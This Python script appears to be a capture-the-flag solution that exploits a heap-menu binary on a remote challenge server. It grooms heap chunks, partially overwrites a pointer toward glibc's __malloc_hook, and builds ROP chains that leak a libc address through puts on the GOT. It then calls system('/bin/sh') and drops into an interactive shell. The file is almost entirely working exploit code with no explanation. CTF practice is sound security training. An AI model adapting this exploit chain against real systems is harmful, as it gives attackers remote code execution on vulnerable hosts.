#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './pwn'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'halleb3rry-01.pwn.beer', 'port':6666})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_alloc          = 0x40096d

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_free_hook = libc.symbols['__free_hook']
offset_libc_main        = libc.sep_function['__libc_start_main']
offset_libc_malloc_hook = libc.symbols['__malloc_hook']

#==========

def attack(conn, **kwargs):
    pwn = Pwn(conn)

    conn.sendlineafter('name: ', 'hoge')

    pwn.add(0x18, 'a')
    pwn.delete()

    pwn.add(0x80, 'b')
    pwn.delete()

    pwn.add(0x28, 'c')
    pwn.add(0x80, 'B')
    pwn.delete()
    pwn.delete()

    for _ in range(3):
        pwn.add(0x80, '\x90')
    pwn.delete()

    pwn.add(0x18, '0')
    pwn.edit(0x20, offset_libc_malloc_hook & 0xff)

    rop = ROP(binf)
    pwn.add(0x80, '1')
    pwn.add(0x80, p64(rop.r12_r13_r14_r15.address))

    rop.puts(addr_got_main)
    rop.call(addr_alloc)
    conn.sendlineafter('> ', '1')
    conn.sendlineafter('size: ', '1_______' + str(rop))

    addr_libc_main  = u(conn.recvuntil('\n', drop=True))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(binf)
    rop.call(rop.ret)
    rop.call(addr_libc_system, [addr_libc_str_sh])
    conn.sendlineafter('size: ', '1_______' + str(rop))
    
class Pwn:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, size, data):
        self.sendlineafter('> ', '1')
        self.sendlineafter('size: ', str(size))
        self.sendafter('data: ', data)

    def edit(self, idx, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('index: ', str(idx))
        self.sendlineafter('byte: ', str(data))

    def delete(self):
        self.sendlineafter('> ', '3')

    def show(self):
        self.sendlineafter('> ', '4')
        self.recvuntil('pwner: ')
        return self.recvuntil('\n+', drop=True)


#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
